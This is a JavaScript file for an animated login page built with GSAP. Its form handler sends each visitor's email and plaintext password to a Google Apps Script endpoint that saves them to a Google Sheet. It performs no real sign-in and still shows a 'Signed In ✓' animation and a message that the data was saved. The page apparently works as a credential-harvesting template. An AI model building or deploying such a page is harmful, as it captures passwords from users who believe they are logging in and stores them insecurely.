/* ====== GSAP animations and form handling ====== */
window.addEventListener('load', () => {
  // Elements
  const card = document.getElementById('card');
  const avatar = document.getElementById('avatar');
  const fields = document.querySelectorAll('.field');
  const btn = document.getElementById('btn');
  const bgImg = document.querySelector('.bg-img');

  // Entrance timeline
  const tl = gsap.timeline({defaults:{duration:0.7, ease:"power3.out"}});
  tl.from(card, {y:30, opacity:0, scale:0.985})
    .from(avatar, {y:-10, scale:0.6, opacity:0, ease:"back.out(1.4)"}, "-=0.45")
    .from(fields, {y:14, opacity:0, stagger:0.09}, "-=0.45")
    .from(btn, {y:8, opacity:0}, "-=0.3");

  // subtle idle floating animation for card & avatar (loops)
  gsap.to(card, {y:"+=6", duration:6, yoyo:true, repeat:-1, ease:"sine.inOut", opacity:1, delay:1});
  gsap.to(avatar, {y:"+=6", duration:4.2, yoyo:true, repeat:-1, ease:"sine.inOut", delay:1.2});

  // button press micro animation on hover
  btn.addEventListener('mouseenter', ()=> gsap.to(btn, {scale:1.02, duration:0.18, ease:"power2.out"}));
  btn.addEventListener('mouseleave', ()=> gsap.to(btn, {scale:1, duration:0.18, ease:"power2.out"}));
  btn.addEventListener('mousedown', ()=> gsap.to(btn, {scale:0.98, duration:0.08}));
  btn.addEventListener('mouseup', ()=> gsap.to(btn, {scale:1.02, duration:0.08}));

  // mousemove parallax for background and slight card tilt
  const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
  window.addEventListener('mousemove', (e) => {
    const w = window.innerWidth, h = window.innerHeight;
    const nx = (e.clientX / w) - 0.5; // -0.5 .. 0.5
    const ny = (e.clientY / h) - 0.5;
    // background moves opposite a bit for depth
    gsap.to(bgImg, {x: clamp(nx * -30, -40, 40), y: clamp(ny * -20, -30, 30), scale: 1.02, duration: 0.8, ease:"power3.out"});
    // card slightly follows the cursor
    gsap.to(card, {rotateY: clamp(nx * 6, -8, 8), rotateX: clamp(ny * -4, -6, 6), duration: 0.8, ease:"power3.out"});
  });

  // reset transforms on mouse leave
  window.addEventListener('mouseleave', () => {
    gsap.to([bgImg, card], {x:0, y:0, rotateX:0, rotateY:0, duration:0.8, ease:"power3.out"});
    gsap.to(bgImg, {scale:1, duration:0.8, ease:"power3.out"});
  });

  // success micro animation on submit
  async function showSuccessSequence(){
    // disable button while animating
    btn.disabled = true;
    await gsap.to(btn, {scale:0.96, duration:0.06});
    // brighten card & pulse
    gsap.to(card, {boxShadow:"0 30px 80px rgba(16,185,129,0.18)", duration:0.28});
    await gsap.to(btn, {background:"#10b981", duration:0.18});
    const original = btn.innerHTML;
    btn.innerHTML = 'Signed In ✓';
    await gsap.to(btn, {y:-6, duration:0.18, ease:"power2.out"});
    await new Promise(r=>setTimeout(r,700));
    // restore
    btn.innerHTML = original;
    btn.disabled = false;
    gsap.to(card, {boxShadow:"0 20px 50px rgba(8,15,30,0.18)", duration:0.28});
    gsap.to(btn, {y:0, scale:1, duration:0.18});
  }

  // attach to global for handleSubmit to call
  window.showSuccessSequence = showSuccessSequence;
});

/* ====== Form submit + Google Sheet push (same as before) ====== */
const SHEET_ENDPOINT = 'https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec';

async function handleSubmit(e){
  e.preventDefault();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();

  if(!email || !password){
    alert('Please enter email and password');
    return;
  }

  // send to Google Apps Script (best-effort)
  try{
    await fetch(SHEET_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, ts: new Date().toISOString() })
    });
  } catch(err) {
    console.warn('Sheet save failed', err);
  }

  // run the success animation (uses GSAP timeline set earlier)
  if(window.showSuccessSequence) await window.showSuccessSequence();

  // demo action: show a simple message or redirect
  setTimeout(()=> {
    alert('Welcome — your data was saved (if the sheet endpoint is configured).');
  }, 300);
}

// attach form submit
document.addEventListener('DOMContentLoaded', ()=>{
  const form = document.getElementById('loginForm');
  if(form) form.addEventListener('submit', handleSubmit);
});
